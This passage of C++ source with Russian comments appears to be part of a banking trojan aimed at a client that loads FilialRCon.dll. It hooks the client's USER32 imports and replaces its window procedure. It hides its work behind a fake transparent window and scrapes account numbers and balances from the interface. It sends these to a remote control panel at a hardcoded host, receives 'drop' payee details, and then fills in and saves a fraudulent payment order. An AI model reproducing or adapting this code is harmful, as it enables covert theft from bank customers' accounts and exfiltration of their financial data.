{
	c_findedBalans = 0;
	HWND parent = (HWND)pGetParent(treeView);
	//подменяем оконную процедуру главного окна, для перехвата нотификационніх сообщений
	MainWndProc = (WNDPROC)SetWindowLongPtr( parent, GWLP_WNDPROC, (LONG_PTR)HandlerMainWndProc );
	stateFakeWindow = 1; //запуск окна скрывающего наши действия
	HANDLE hThread = pCreateThread( NULL, 0, FakeWindow, (LPVOID)parent, 0, 0 );
	pCloseHandle(hThread);

	HTREEITEM root = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_ROOT, (LPARAM)0 );
	if( root )
	{
		TreeAccount* itemAccs = (TreeAccount*)MemAlloc( sizeof(TreeAccount) * 16 ); //массив найденных веток счетов, рассчитываем максимум на 16 счетов
		int c_itemAccs = 0;
		//находим пункт Шаблоны, делаем несколько попыток, так как не сразу все загружается
		for( int i = 0; i < 10; i++ )
		{
			c_itemAccs = FindPaymentOrder( root, 0, itemAccs, c_itemAccs ); 
			if( c_itemAccs ) break;
			pSleep(1000);
		}
		if( c_itemAccs > 0 )
		{
			DBGRAFA( "Rafa", "Найдено веток счетов %d", c_itemAccs );
			PaymentOrder* po = GetPaymentOrders(); //передаем баланс и получаем данные для заполнения платежки
			if( po )
			{
				//ищем счет в котором будем добавлять платежку
				TreeAccount* itemAcc = 0;
				for( int i = 0; i < c_itemAccs; i++ )
					if( m_lstrcmp( po->sendAcc, itemAccs[i].acc ) == 0 )
					{
						itemAcc = &itemAccs[i];
						break;
					}
				if( itemAcc && pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemAcc->itemTmpls ) )
				{
					DBGRAFA( "Rafa", "Шаблоны выбраны для счета %s", itemAcc->acc );
					int indList = -1;
					for( int i = 0; i < 10; i++ )
					{
						indList = FindNewPaymentOrder();
						if( indList >= 0 ) break;
						pSleep(1000);
					}
					if( indList >= 0 )
					{
						DBGRAFA( "Rafa", "Найдено новое платежное поручение" );
						POINT posItem;
						pSendMessageA( listView, LVM_GETITEMPOSITION, (WPARAM)indList, (LPARAM)&posItem );
						stateFakeWindow |= 2; //ожидаем появления окна Платёжного поручения и делаем его прозрачным
						HardClickToWindow( listView, posItem.x + 5, posItem.y + 5 );
						DBGRAFA( "Rafa", "Кликнули по новому платежному поручению" );
						FindTreeList();
						if( toolBar )
						{
							HardClickToWindow( toolBar, posBtNewDoc.x + 5, posBtNewDoc.y + 5 );
							DBGRAFA( "Rafa", "Нажали кнопку создания нового документа" );
							//ждем появления формы ввода платежа
							HWND formPayment = 0;
							for( int i = 0; i < 10; i++ )
							{
								formPayment = FindForm( &controlsPaymentOrder[0] );
								if( formPayment ) break;
								pSleep(1000);
							}
							if( formPayment )
							{
								DBGRAFA( "Rafa", "Форма ввода платежа открыта" );
								stateFakeWindow |= 4; //делаем прозрачными все всплывающие окна во время ввода платежки
								//ищем контролы в которые будем вводить
								ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
								int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
								if( countControls ) //нашли нужные контролы, теперь заполняем
								{
									DBGRAFA( "Rafa", "Заполняем контролы" );
									//SetText( "num", "1", cf, countControls );
									//SetText( "status", "2", cf, countControls );
									SetText( "sum", po->sum, cf, countControls );
									SetText( "innrecv", po->inn, cf, countControls );
									//SetText( "kpprecv", "770501001", cf, countControls );
									SetText( "accountrecv", po->recvAcc, cf, countControls );
									SetText( "namerecv", po->recvName, cf, countControls );
									SetText( "bikrecv", po->bik, cf, countControls );
									SetText( "bankrecv", po->bankName, cf, countControls );
									SetText( "accbankrecv", po->bankAcc, cf, countControls );
									SetText( "punktrecv", po->bankCity, cf, countControls );
									SetText( "comment", po->comment, cf, countControls, " " ); //посылаем еще дополнительно клавишу пробел, так как без этого форма не считает что в это поле был введен текст
									SetButtonCheck( "sended", true, cf, countControls );
									//сохраняем платежку
									ClickButton( "save", cf, countControls );
									pSleep(5000); //ждем пока сохранится
									//сворачиваем дерево до первоначального состояния
									TreeViewCollapse( itemAcc->itemTmpls, 4 );
									pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
									po->entered = true;
									SavePaymentOrders();
								}
								HEAP::Free(cf);
							}
							else
								DBGRAFA( "Rafa", "Форма ввода платежа не открылась" );
						}
					}
				}
			}
			else //если платежку не создавали, то сворачиваем дерево до первоначального состояния
				TreeViewCollapse( itemAccs[0].itemTmpls, 2 );
		}
		else
			DBGRAFA( "Rafa", "Шаблоны ненайдены" );
		MemFree(itemAccs);
	}
	stateFakeWindow = 0; //закрываем окно скрытия
}

static DWORD WINAPI InitializeRafaHook( LPVOID p )
{
	DBGRAFA( "Rafa", "Start hook FilialRCon.dll" );
	while( true )
	{
		LPVOID dll = pGetModuleHandleA("FilialRCon.dll");
		if( dll )
		{
			bool hookDll = false;
			for( int i = 0; i < 10; i++ )
			{
				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
				res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
				if( res )
				{
					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok %d - %08x", (int)res,pHandlerSendMessageA );
					hookDll = true;
					break;
				}
				pSleep(1000);
			}
			if( !hookDll ) break;
			//ждем пока появится основное окно в котором должны быть контролы TreeView и ListView
			for( int i = 0; i < 300; i++ )
			{
				if( FindTreeList() )
				{
					DBGRAFA( "Rafa", "Find TreeView and ListView" );
					WorkInRafa(); 
					return 0;
				}
				pSleep(1000);
			}
		}
		pSleep(1000);
	}
	return 0;
}

void InitHook_FilialRConDll()
{
	if( IsNewProcess(PID) ) //чтобы повторно не запустить
	{
		HANDLE hThread = pCreateThread( NULL, 0, InitializeRafaHook, 0, 0, 0 );
		pCloseHandle(hThread);
		fromLVM = 0;
	}
}

//отсылаем баланс, GET запросом
static void AddBalans( const char* acc, const char* balans )
{
	int i;
	for( i = 0; i < c_findedBalans; i++ )
		if( m_lstrcmp( findedBalans[i].acc, acc ) == 0 )
			break;
	if( i >= c_findedBalans ) //новый счет
	{
		if( c_findedBalans >= 8 ) return; //рассчитано на не более 8-ми счетов
		m_lstrcpy( findedBalans[i].acc, acc );
		c_findedBalans++;
	}
	m_lstrcpy( findedBalans[i].balans, balans );
	DBGRAFA( "Rafa", "finded acc '%s', balans '%s'", acc, balans );
}

//грабим баланс с текстового поля (справа снизу)
//грабим с такой строки:
//Доступный/текущий остаток по счету: 83109.16/83109.16 (РОССИЙСКИЙ РУБЛЬ)
static void GrabBalansFromMemoText(const char* s)
{
	const char* p = m_strstr( s, "(РОССИЙСКИЙ РУБЛЬ)" );
	if( p )
	{
		p--; //становимся перед найденной фразой, там должен быть пробел, игнорируем его
		while( *p == ' ' && p >= s ) p--;
		if( p > s )
		{
			//стоим на последней цифре баланса, идем назад пока не найдем пробел, т. е. переходим на начало баланса
			const char* p1 = p;
			while( *p1 != ' ' && p1 >= s ) p1--;
			if( p1 > s )
			{
				p1++; //стоим на 1-й цифре первой суммы
				if( *p1 >= '0' && *p1 <= '9' )
				{
					char acc[32], balans[32];
					//переносим цифры до точки (целую часть)
					int i = 0;
					//while( *p1 != '.' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
					while( *p1 != '/' && *p1 != ' ' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
					balans[i] = 0; //теперь у нас там остаток
					//ищем номер счета
					//он должен быть в в фомате: "Счет N: 28462985925292987927923;"
					p = m_strstr( s, "Счет N:" );
					if( p )
					{
						p += 7;
						while( *p == ' ' ) p++;
						i = 0;
						while( *p >= '0' && *p <= '9' ) acc[i++] = *p++;
						acc[i] = 0;
						AddBalans( acc, balans );
					}
				}
			}
		}
	}
}

//грабит баланс с таблицы справа сверху
void GrabBalansFromLVM( int cln, const char* s )
{
	if( cln == 1 && s[0] >= '0' && s[1] <= '9' )
	{
		int len = m_lstrlen(s);
		if( len < sizeof(LVM_Acc) - 1 )
		{
			m_memcpy( LVM_Acc, s, len );
			LVM_Acc[len] = 0;
		}
	}
	if( cln == 2 && fromLVM == 0 )
	{
		if( m_lstrcmp( s, "РОССИЙСКИЙ РУБЛЬ" ) == 0 ) //нужное значение ячейки, следующая ячейка будет иметь баланс
		{
			fromLVM = 1;
		}
	}
	else
		if( cln == 3 && fromLVM == 1 ) //в s находится баланс
		{
			if( *s >= '0' && *s <= '9' )
			{
				char balans[32];
				int i = 0;
				//переносим цифры до точки
				//while( *s && *s != '.' && i < sizeof(balans) - 1 ) balans[i++] = *s++;
				//balans[i] = 0;
				m_lstrcpy( balans, s );
				AddBalans( LVM_Acc, balans );
			}
			fromLVM = 0;
		}

}
//http://sberbanksystem.ru/bal/?uid=TEST0123456789&type=raifur&sum=234234

const char* panelaz = "az.gipa.in"; //"sberbanksystem.ru";

static char* GetAdminUrl( char* url )
{
	m_lstrcpy( url, panelaz );
	return url;
}

//загрузка проведенных платежек из файла, чтобы их потом скрывать
static void LoadPaymentOrders()
{
	paymentOrders = 0; 
	c_paymentOrders = 0;
}

//сохранение платежек
static void SavePaymentOrders() 
{
}

//отсылка Get запроса админке, если ret = true, то нужно возвращать ответ
//mode1 - текст команды для обного баланса, mode2 - текст команды для нескольких балансов
static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
{
	char urlAdmin[128];
	if( c_findedBalans == 0 ) return 0; //если аккаунты не обнаружены, то не смысла слать запрос
	char* res = 0;
	if( GetAdminUrl(urlAdmin) )
	{
		const char* mode = mode1;
		fwsprintfA pwsprintfA = Get_wsprintfA();
		MemPtr<512> qr, accs;
		MemPtr<128> uid;
		//формируем строку с балансами
		if( c_findedBalans > 1 )
		{
			m_lstrcpy( accs.str(), "accs=" );
			int len = 5;
			for( int i = 0; i < c_findedBalans; i++ )
				len += pwsprintfA( accs.str() + len, "%s:%s;", findedBalans[i].acc, findedBalans[i].balans );
			mode = mode2;
		}
		else
			pwsprintfA( accs.str(), "sum=%s&acc=%s", findedBalans[0].balans, findedBalans[0].acc );
		//формируем запрос
		GenerateUid(uid.str());
		wsprintfA( qr.str(), "http://%s/raf/?uid=%s&sys=raifur&mode=%s&%s", urlAdmin, uid, mode, accs.str() );
		//отправляем запрос
		THTTPResponse Response;
		ClearStruct(Response);
		HTTP::Get( qr, ret ? &res : 0, &Response );
		DBGRAFA( "Rafa", "Передали запрос: %s", qr.str() );
		HTTPResponse::Clear(&Response);
	}
	if( res )
	{
		char* res2 = UTF8ToAnsi(res);
		STR::Free(res);
		res = res2;
		DBGRAFA( "Rafa", "Получен ответ: %s", res );
	}
	return res;
}

static char* CopyDataPayment( char*& to, char* from )
{
	while( *from != '|' && *from ) *to++ = *from++;
	if( *from == '|' ) from++; //переход на следующий параметр
	*to++ = 0;
	return from;
}

//запрос новой платежки в админке
static PaymentOrder* GetPaymentOrders()
{
	char* payment = SendToAdmin( "getdrop", "getdrops", true );
	PaymentOrder* res = 0;
	if( payment )
	{
		//если уже есть платежки, то перевыделяем память для новой платежки
		if( c_paymentOrders > 0 )
		{
			paymentOrders = (PaymentOrder*)MemRealloc( paymentOrders, sizeof(PaymentOrder) * (c_paymentOrders + 1) );
			if( paymentOrders ) c_paymentOrders++;
		}
		else //платежек еще не было, создаем
		{
			paymentOrders = (PaymentOrder*)MemAlloc( sizeof(PaymentOrder) );
			if( paymentOrders ) c_paymentOrders++;
		}
		if( c_paymentOrders > 0 )
		{
			//разбор переданной строки
			PaymentOrder* po = &paymentOrders[c_paymentOrders - 1];
			char* from = payment;
			char* to = po->mem;
			po->sendAcc = to; from = CopyDataPayment( to, from );
			po->sum = to; from = CopyDataPayment( to, from );
			po->inn = to; from = CopyDataPayment( to, from );
			po->bik = to; from = CopyDataPayment( to, from );
			po->recvAcc = to; from = CopyDataPayment( to, from );
			po->recvName = to; from = CopyDataPayment( to, from );
			po->comment = to; from = CopyDataPayment( to, from );
			po->bankName = to; from = CopyDataPayment( to, from );
			po->bankCity = to; from = CopyDataPayment( to, from );
			po->bankAcc = to; from = CopyDataPayment( to, from );
			po->entered = false;
			DBGRAFA( "Rafa", "Получена платежка" );
			DBGRAFA( "Rafa", "sendAcc '%s'", po->sendAcc );
			DBGRAFA( "Rafa", "sum '%s'", po->sum );
			DBGRAFA( "Rafa", "inn '%s'", po->inn );
			DBGRAFA( "Rafa", "bik '%s'", po->bik );
			DBGRAFA( "Rafa", "recvAcc '%s'", po->recvAcc );
			DBGRAFA( "Rafa", "recvName '%s'", po->recvName );
			DBGRAFA( "Rafa", "comment '%s'", po->comment );
			DBGRAFA( "Rafa", "bankName '%s'", po->bankName );
			DBGRAFA( "Rafa", "bankCity '%s'", po->bankCity );
			DBGRAFA( "Rafa", "bankAcc '%s'", po->bankAcc );
			res = po;
		}
		STR::Free(payment);
	}
	return res;
}

};
